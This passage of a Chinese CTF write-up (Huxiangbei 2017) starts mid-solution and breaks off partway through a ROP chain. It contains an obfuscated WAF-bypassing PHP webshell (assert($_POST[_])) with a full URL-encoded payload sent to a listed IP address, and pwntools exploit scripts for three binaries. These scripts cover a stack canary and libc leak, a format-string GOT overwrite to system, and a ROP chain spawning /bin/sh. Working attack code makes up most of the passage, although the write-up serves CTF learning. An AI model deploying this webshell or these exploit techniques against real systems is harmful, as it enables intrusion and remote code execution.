class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=$<span class="variable">$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>
+<p>根据本题的 waf，还是需要绕过一下，@ 用来屏蔽错误，可以去掉，不影响功能。<br>用来获取 Array 字符串的双引号可以采用 $_=’’.[]; 来绕过。</p>
+<p>最后可以绕过本题 waf 的 webshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$_</span>=<span class="string">''</span>.[];<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">'_'</span>==<span class="string">'__'</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">'_'</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br></pre></td></tr></table></figure>
+<p>编码后即可成功上传 webshell</p>
+<p>最终 payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://114.215.133.202:10080/index.php?content=%24_%3D%27%27.%5B%5D%3B%24_%3D%24_%5B%27_%27%3D%3D%27__%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B</span><br><span class="line"></span><br><span class="line">&lt;?php <span class="variable">$flag</span>=<span class="string">"=hxb2017&#123;51f759f39ac1f0cd5509b299b1d908f7&#125;"</span>; ?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="PWN100"><a href="#PWN100" class="headerlink" title="PWN100"></a>PWN100</h1><p>把 pwns100 直接拖入 ida 中：<br>main函数：</p>
+<p><img src="pwn100_1.png" alt=""></p>
+<p>base64 解码函数</p>
+<p><img src="pwn100_2.png" alt=""></p>
+<p>输入函数</p>
+<p><img src="pwn100_3.png" alt=""></p>
+<p>可以看到 read 可以输入的字符串可以长达 0x200 个，这里可造成缓冲区溢出漏洞<br>这个程序很简单，输入 base64 字符串输出 base64 解码之后的字符串<br>先运行一下程序看一下这个程序干了啥：</p>
+<p><img src="pwn100_4.png" alt=""></p>
+<p>再看看程序开启了哪些保护：</p>
+<p><img src="pwn100_5.png" alt=""></p>
+<p>因为这个程序开了 Canary，这个题目的要利用 printf 泄露这个程序中的 Canary，然后再泄露 libc 的基地址，最后利用溢出重新布置栈空间 getshell。<br>因为每次 fork,子进程复制父进程的数据空间(数据段)、栈和堆，父、子进程共享正文段。也就是说，对于程序中的数据，子进程要复制一份，但是对于指令，子进程并不复制而是和父进程共享，具体可参考<a href="https://www.cnblogs.com/bwangel23/p/4190043.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4190043.html</a> 这个文章，所以虽然在泄露 Canary 或者 libc 的时候使子进程崩溃了，但是不会影响父进程的稳定性。<br>所以我的 exp 是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048B09'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">local_MAGIC = 0x0003AC69</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwns'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote('104.224.169.128', 18887)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getCanary</span></span><br><span class="line">payload = <span class="string">'a'</span>*0x102</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">myCanary=io.recv()[268:271]</span><br><span class="line">Canary=<span class="string">"\x00"</span>+myCanary</span><br><span class="line"><span class="built_in">print</span> <span class="string">"Canary:"</span>+hex(u32(Canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#getlibc</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">'a'</span>*0x151</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">mylibc=io.recv()[347:351]</span><br><span class="line">base_libc=u32(mylibc)-0x18637</span><br><span class="line"><span class="built_in">print</span> <span class="string">"mylibc_addr:"</span>+hex(base_libc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">MAGIC_addr=local_MAGIC+base_libc</span><br><span class="line">payload = <span class="string">'a'</span>*0x101+Canary+<span class="string">"a"</span>*0xc+p32(MAGIC_addr)</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+<p>讲解一下如何获取 Canary，因为输入的输入数据会被 printf 输出，遇到 0x00 的时候停止输出，如果输入的输入刚刚好覆盖到 Canary 前面就可以用 printf 输出 Canary 了，但是 Canary 后两位是 0x00,所以得到输出之后要补足后两位的 0x00</p>
+<p><img src="pwn100_6.png" alt=""></p>
+<p>同理也可以用这种方法计算出__libc_start_main 和 libc 的基地址</p>
+<p><img src="pwn100_7.png" alt=""></p>
+<p>计算出 Canary 的值和基地址后，就可以通过溢出让程序程序跳转到 MAGIC 去了，就可以 getshell 了，至于 MAGIC 是啥，大家可以翻一下这篇文章：<a href="http://blog.csdn.net/niexinming/article/details/78512274" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78512274</a><br>最后的效果是：</p>
+<p><img src="pwn100_8.png" alt=""></p>
+<h1 id="PWN-200"><a href="#PWN-200" class="headerlink" title="PWN 200"></a>PWN 200</h1><p>把 pwns200 直接拖入 ida 中：<br>main 函数：</p>
+<p><img src="pwn200_1.jpg" alt=""></p>
+<p>sub_80485CD 函数：</p>
+<p><img src="pwn200_2.jpg" alt=""></p>
+<p>在 sub_80485CD 函数可以看到输入的数据直接进入了 printf 函数中，所以这个肯定是一个格式化字符串漏洞<br>先运行一下程序看一下这个程序干了啥</p>
+<p><img src="pwn200_3.jpg" alt=""></p>
+<p>再看看程序开启了哪些保护:</p>
+<p><img src="pwn200_4.jpg" alt=""></p>
+<p>这个程序开了 Canary 和栈不可执行<br>这个题目的思路和<a href="http://blog.csdn.net/niexinming/article/details/78512274" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78512274</a> 差不多，唯一不同的是上一个题目提供了 system 函数，这个题目要从 libc 中找 system 函数，所以首先通过 printf 打印__libc_start_main 函数这个地址，然后根据偏移计算 libc 的基地址，然后计算出 system 的实际地址，最后用 fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr}) 把 atio 的地址覆盖为 system 的地址，就可以 getshell 了。</p>
+<p>我的exp是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x0804867E'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(r, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,offset):</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#localsystem = 0x0003ADA0</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('hackme.inndy.tw', 7711)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    info = r.recv().splitlines()[1]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"info:"</span>+info</span><br><span class="line">    r.sendline(<span class="string">'10'</span>)</span><br><span class="line">    <span class="comment">#r.close()</span></span><br><span class="line">    <span class="built_in">return</span> info</span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line">atoi_got_addr = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%x"</span> % atoi_got_addr</span><br><span class="line">system_offset_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%x"</span> % system_offset_addr</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">"%35<span class="variable">$p</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">libc_start_main = r.recv().splitlines()[1]</span><br><span class="line">libc_module=base_addr(libc_start_main,0x18637)</span><br><span class="line">system_addr=libc_module+system_offset_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">r.sendline(<span class="string">'10'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(autofmt.offset, &#123;atoi_got_addr: system_addr&#125;)</span><br><span class="line">r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment">#r.sendline('10')</span></span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
+<p>效果是：</p>
+<p><img src="pwn200_5.jpg" alt=""></p>
+<h1 id="PWN-300"><a href="#PWN-300" class="headerlink" title="PWN 300"></a>PWN 300</h1><p>把 pwn300 直接拖入 ida 中：<br>main 函数：</p>
+<p><img src="pwn300_1.jpg" alt=""></p>
+<p>add 函数：</p>
+<p><img src="pwn300_2.jpg" alt=""></p>
+<p>这个题目很有意思，首先开辟一个3到255大小的堆空间，然后做加减乘除的计算之后把计算结果放入堆中，最后可以把所有的计算结果用 memcpy 函数全部放入函数的临时变量 v5 中也就是栈中，这样就会造成栈溢出。<br>先运行一下程序看一下这个程序干了啥：</p>
+<p><img src="pwn300_3.jpg" alt=""></p>
+<p>再看看程序开启了哪些保护:</p>
+<p><img src="pwn300_4.jpg" alt=""></p>
+<p>看到这个程序开了栈不可执行，于是肯定就会想到用 rop 来做<br>这个题目用 ida 打开之后发现有很多函数，所以判断这个题目是静态编译</p>
+<p><img src="pwn300_5.jpg" alt=""></p>
+<p>所以可以用 <a href="http://blog.csdn.net/niexinming/article/details/78259866" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78259866</a> 中我提到的 ROPgadget 工具来做，不出意外，很成功的找了完整的 rop 链</p>
+<p><img src="pwn300_6.jpg" alt=""></p>
+<p>这个题目还有个难点就是不能直接输入十六进制，所以根据<a href="http://blog.csdn.net/niexinming/article/details/78666941" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78666941</a> 我的这篇文件可以用 ctypes.c_int32(0x123).value 进行转换<br>所以我的 exp 是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">import ctypes as ct</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048ff5'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,offset):</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/pwn300'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwn300'</span>)</span><br><span class="line"></span><br><span class="line">p=[]</span><br><span class="line"></span><br><span class="line">p.append( 0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append( 0x080ea060)  <span class="comment"># @ .data</span></span><br><span class="line">p.append( 0x080bb406)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">p.append(<span class="built_in">eval</span>(<span class="string">'0x'</span>+binascii.b2a_hex(<span class="string">'nib/'</span>)))</span><br><span class="line">p.append( 0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append( 0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append( 0x080ea064)  <span class="comment"># @ .data + 4</span></span><br><span class="line">p.append( 0x080bb406)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">p.append(<span class="built_in">eval</span>(<span class="string">'0x'</span>+binascii.b2a_hex(<span class="string">'hs//'</span>)))</span><br><span class="line">p.append(0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x08054730)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p.append(0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(0x080481c9)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p.append(0x080ea060)  <span class="comment"># @ .data</span></span><br><span class="line">p.append(0x0806ed31)  <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x080ea060)  <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p.append(0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x08054730)  <span class="comment"># 